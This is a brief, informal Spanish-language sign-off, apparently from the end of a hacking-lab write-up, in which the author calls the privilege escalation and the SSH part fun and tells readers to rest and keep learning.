El privesc fue movidito, el tema de **SSH** fue bastante curioso y entretenido. El jugar con esa capability algo bastante peligroso.

Por hoy no es más, descansamos un poco los ojos, miramos izquierda y derecha, estiramos las manos yyyyyy a seguir aprendiendo! ¡A romper todooooooooooOOO!!